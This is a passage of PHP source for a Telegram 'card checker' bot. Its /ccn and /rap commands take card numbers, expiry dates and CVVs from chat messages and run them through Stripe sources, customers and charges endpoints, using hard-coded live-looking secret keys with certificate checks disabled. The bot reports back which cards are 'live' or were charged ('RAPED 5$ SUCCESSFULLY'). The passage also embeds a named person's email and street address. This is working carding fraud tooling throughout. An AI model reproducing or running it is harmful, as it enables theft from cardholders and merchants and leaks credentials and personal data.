                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
                curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=100&currency=usd&customer='.$tok2.'');
                $result3 = curl_exec($ch);
                $msg3 = Getstr($result3,'"message": "','"');
                $rcp = trim(strip_tags(getStr($result3,'"receipt_url": "','"')));
                $rsk = trim(strip_tags(getStr($result3,'"risk_score": "','"')));
                $rsklv = trim(strip_tags(getStr($result3,'"risk_level": "','"')));
                if(strpos($result3, '"seller_message": "Payment complete."' )) {
                sendMessage($chatId, "<b>Card: <code>$lista</code><b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
                }
                if(strpos($result3, "insufficient_funds" )) {
                  sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ✅</b>%0A<b>Response -» Insufficient Funds </b>%0A<b>Gateway -» Stripe Charge v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
                if ((strpos($result3, "card_error_authentication_required")) || (strpos($result2, "card_error_authentication_required"))){ sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APROVED ⚠️</b>%0A<b>Response -» 3D Card </b>%0A<b>Gateway -» Stripe charge v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
                if(strpos($result3,'"cvc_check": "pass"')){
                  sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ✅</b>%0A<b>Response -» CVC APPROVED ✅</b>%0A<b>Gateway -» Stripe charge v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
                if(strpos($result3,'"code": "incorrect_cvc"')){
                    sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ⚠️</b>%0A<b>Response -» CCN Matched </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
                  if(strpos($result3,'"code": "incorrect_cvc"')){
                    sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ⚠️</b>%0A<b>Response -» CCN Matched </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
                  if ((strpos($result3, "transaction_not_allowed")) || (strpos($result3, "transaction_not_allowed"))){
                    sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» HOLDERLOCKED ⚠️</b>%0A<b>Response -» Transaction Not Allowed </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b", $message_id);}
                  if ((strpos($result3, "fraudulent"))){
                    sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» REJECTED ⛔</b>%0A<b>Response -» Fraudulent </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
                  if ((strpos($result3, "expired_card"))){
                    sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» expired_card </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
                  if ((strpos($result3, "generic_declined"))){
                    sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Generic Declined </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    }
                  if ((strpos($result3, "do_not_honor"))){
                    sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Do Not Honor </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
                  if ((strpos($result3, 'rate_limit'))){
                    sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN LATER ⚠️</b>%0A<b>Response -» SK is rate limit </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
                    
                  if ((strpos($result3, "Your card was declined."))){
                    sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Do Not Honor </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
                  if ((strpos($result3, ' "message": "Your card number is incorrect."')) || (strpos($result3, ' "message": "Your card number is incorrect."'))){
                    sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» No Account </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
                else {
                  sendMessage($chatId, "<b>Your cc: $lista</b>\nResult: $msg2 | $msg3\nBot by: @xxx", $message_id);
                  }
                }
//////////=========[ccn Command]=========//////////
elseif (strpos($message, "/ccn") === 0){
    $skeys = array(
        1 => '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', // Enter at least one sk key
      //2 => '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',-----------------|
      //3 => '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',                 | Uncomment this, if you want to add more sk keys :)
      //4 => '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',                 |
      //5 => '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',-----------------|
      ); 
      $skey = array_rand($skeys);
      $sk = $skeys[$skey];
   
    $message = substr($message, 4);
    $amt = multiexplode(array("/", ":", " ", "|"), $message)[0];
    $cc = multiexplode(array(":", "/", " ", "|"), $message)[1];
    $mm = multiexplode(array(":", "/", " ", "|"), $message)[2];
    $yy = multiexplode(array(":", "/", " ", "|"), $message)[3];
    $cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
    if (empty($amt)) {
    $amt = '1';
    }
            $amount = $amt * 100;
            $lista = ''.$cc.'|'.$mm.'|'.$yy.'|'.$cvv.'';
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: lookup.binlist.net',
            'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, '');
            $fim = curl_exec($ch);
            $bank = GetStr($fim, '"bank":{"name":"', '"');
            $name = GetStr($fim, '"name":"', '"');
            $brand = GetStr($fim, '"brand":"', '"');
            $country = GetStr($fim, '"country":{"name":"', '"');
            $emoji = GetStr($fim, '"emoji":"', '"');
            $scheme = GetStr($fim, '"scheme":"', '"');
            $type = GetStr($fim, '"type":"', '"');
            if(strpos($fim, '"type":"credit"') !== false){
            $bin = 'Credit';
            }else{
            $bin = 'Debit';
            };
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
            curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]=Corey Stowe&owner[email]=cstowe083@gmail.com&owner[address][line1]=2509 Mountainview Dr&owner[address][city]=Corinth&owner[address][state]=Texas&owner[address][postal_code]=87210&owner[address][country]=US&card[number]='.$cc.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'');
            $result1 = curl_exec($ch);
            $tok1 = Getstr($result1,'"id": "','"');
            $msg1 = Getstr($result1,'"message": "','"');
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
            curl_setopt($ch, CURLOPT_POSTFIELDS, 'description=Stowe&source='.$tok1.'&address[line1]=2509 Mountainview Dr&address[city]=Corinth&address[state]=Texas&address[postal_code]=87210&address[country]=US');
            $result2 = curl_exec($ch);
            $tok2 = Getstr($result2,'"id": "','"');
            $msg2 = Getstr($result2,'"message": "','"');
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
            curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=100&currency=usd&customer='.$tok2.'');
            $result3 = curl_exec($ch);
            $msg3 = Getstr($result3,'"message": "','"');
            $rcp = trim(strip_tags(getStr($result3,'"receipt_url": "','"')));
            $rsk = trim(strip_tags(getStr($result3,'"risk_score": "','"')));
            $rsklv = trim(strip_tags(getStr($result3,'"risk_level": "','"')));
            if(strpos($result3, '"seller_message": "Payment complete."' )) {
            sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED 1$ ✅</b>%0A<b>Response -» CCN LIVE CHARGED 1$ SUCCESSFULLY ✅</b>%0A<b>Gateway -» Stripe Charge v2 </b>%0A<b>Risk score -» $rsk</b>%0A<b> Risk Level -» $rsklv</b>%0A<b> RECEPIT URL -» $rcp</b>%0a%0a---------[Bin details]-----------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY: $country %0A%0A%0A--------------------------------%0A%0A%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
            }
            elseif(strpos($result2, "insufficient_funds" )) {
            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ✅</b>%0A<b>Response -» Insufficient Funds </b>%0A<b>Gateway -» Stripe Charge v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
            elseif ((strpos($result1, "card_error_authentication_required")) || (strpos($result2, "card_error_authentication_required"))){ sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APROVED ⚠️</b>%0A<b>Response -» 3D Card </b>%0A<b>Gateway -» Stripe charge v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
            elseif(strpos($result2,'"cvc_check": "pass"')){
            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ✅</b>%0A<b>Response -» CVC APPROVED ✅</b>%0A<b>Gateway -» Stripe charge v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
            elseif(strpos($result3,'"code": "incorrect_cvc"')){
              sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ⚠️</b>%0A<b>Response -» CCN Matched </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
              elseif(strpos($result2,'"code": "incorrect_cvc"')){
              sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ⚠️</b>%0A<b>Response -» CCN Matched </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
              elseif ((strpos($result2, "transaction_not_allowed")) || (strpos($result3, "transaction_not_allowed"))){
              sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» HOLDERLOCKED ⚠️</b>%0A<b>Response -» Transaction Not Allowed </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b", $message_id);}
              elseif ((strpos($result2, "fraudulent")) || (strpos($result3, "fraudulent"))){
              sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» REJECTED ⛔</b>%0A<b>Response -» Fraudulent </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
              elseif ((strpos($result2, "expired_card")) || (strpos($result3, "expired_card"))){
              sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» expired_card </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
              elseif ((strpos($result2, "generic_declined")) || (strpos($result3, "generic_declined"))){
              sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Generic Declined </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
              }
              elseif ((strpos($result1, "do_not_honor")) || (strpos($result3, "do_not_honor"))){
              sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Do Not Honor </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
              elseif ((strpos($result1, 'rate_limit')) || (strpos($result3, 'rate_limit'))){
              sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN LATER ⚠️</b>%0A<b>Response -» SK is rate limit </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
              
              elseif ((strpos($result1, "Your card was declined.")) || (strpos($result3, "Your card was declined."))){
              sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Do Not Honor </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
              elseif ((strpos($result1, ' "message": "Your card number is incorrect."')) || (strpos($result3, ' "message": "Your card number is incorrect."'))){
              sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» No Account </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
              else {
              sendMessage($chatId, "<b><u><i>Unknown Error</i></u></b>", $message_id);
              };
    
        }
            //////////=========[rap Command]=========//////////
elseif (strpos($message, "/rap") === 0){
    $skeys = array(
        1 => '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', // Enter at least one sk key
      //2 => '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',-----------------|
      //3 => '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',                 | Uncomment this, if you want to add more sk keys :)
      //4 => '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',                 |
      //5 => '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',-----------------|
      ); 
      $skey = array_rand($skeys);
      $sk = $skeys[$skey];
   
    $message = substr($message, 4);
    $amt = multiexplode(array("/", ":", " ", "|"), $message)[0];
    $cc = multiexplode(array(":", "/", " ", "|"), $message)[1];
    $mm = multiexplode(array(":", "/", " ", "|"), $message)[2];
    $yy = multiexplode(array(":", "/", " ", "|"), $message)[3];
    $cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
    if (empty($amt)) {
    $amt = '1';
    }
            $amount = $amt * 100;
            $lista = ''.$cc.'|'.$mm.'|'.$yy.'|'.$cvv.'';
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: lookup.binlist.net',
            'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, '');
            $fim = curl_exec($ch);
            $bank = GetStr($fim, '"bank":{"name":"', '"');
            $name = GetStr($fim, '"name":"', '"');
            $brand = GetStr($fim, '"brand":"', '"');
            $country = GetStr($fim, '"country":{"name":"', '"');
            $emoji = GetStr($fim, '"emoji":"', '"');
            $scheme = GetStr($fim, '"scheme":"', '"');
            $type = GetStr($fim, '"type":"', '"');
            if(strpos($fim, '"type":"credit"') !== false){
            $bin = 'Credit';
            }else{
            $bin = 'Debit';
            };
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
            curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]=Corey Stowe&owner[email]=cstowe083@gmail.com&owner[address][line1]=2509 Mountainview Dr&owner[address][city]=Corinth&owner[address][state]=Texas&owner[address][postal_code]=87210&owner[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'');
            $result1 = curl_exec($ch);
            $tok1 = Getstr($result1,'"id": "','"');
            $msg1 = Getstr($result1,'"message": "','"');
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
            curl_setopt($ch, CURLOPT_POSTFIELDS, 'description=Stowe&source='.$tok1.'&address[line1]=2509 Mountainview Dr&address[city]=Corinth&address[state]=Texas&address[postal_code]=87210&address[country]=US');
            $result2 = curl_exec($ch);
            $tok2 = Getstr($result2,'"id": "','"');
            $msg2 = Getstr($result2,'"message": "','"');
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
            curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=500&currency=usd&customer='.$tok2.'');
            $result3 = curl_exec($ch);
            $msg3 = Getstr($result3,'"message": "','"');
            $rcp = trim(strip_tags(getStr($result3,'"receipt_url": "','"')));
            $rsk = trim(strip_tags(getStr($result3,'"risk_score": "','"')));
            $rsklv = trim(strip_tags(getStr($result3,'"risk_level": "','"')));
            if(strpos($result3, '"seller_message": "Payment complete."' )) {
            sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED 5$ ✅</b>%0A<b>Response -» RAPED 5$ SUCCESSFULLY ✅</b>%0A<b>Gateway -» Stripe Charge v2 </b>%0A<b>Risk score -» $rsk</b>%0A<b> Risk Level -» $rsklv</b>%0A<b> RECEPIT URL -» $rcp</b>%0a%0a---------[Bin details]-----------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY: $country %0A%0A%0A--------------------------------%0A%0A%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
            }
            elseif(strpos($result2, "insufficient_funds" )) {
            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ✅</b>%0A<b>Response -» Insufficient Funds </b>%0A<b>Gateway -» Stripe Charge v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
            elseif ((strpos($result1, "card_error_authentication_required")) || (strpos($result2, "card_error_authentication_required"))){ sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APROVED ⚠️</b>%0A<b>Response -» 3D Card </b>%0A<b>Gateway -» Stripe charge v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
            elseif(strpos($result2,'"cvc_check": "pass"')){
            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ✅</b>%0A<b>Response -» CVC APPROVED ✅</b>%0A<b>Gateway -» Stripe charge v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
            elseif(strpos($result3,'"code": "incorrect_cvc"')){
              sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ⚠️</b>%0A<b>Response -» CCN Matched </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
              elseif(strpos($result2,'"code": "incorrect_cvc"')){
              sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ⚠️</b>%0A<b>Response -» CCN Matched </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
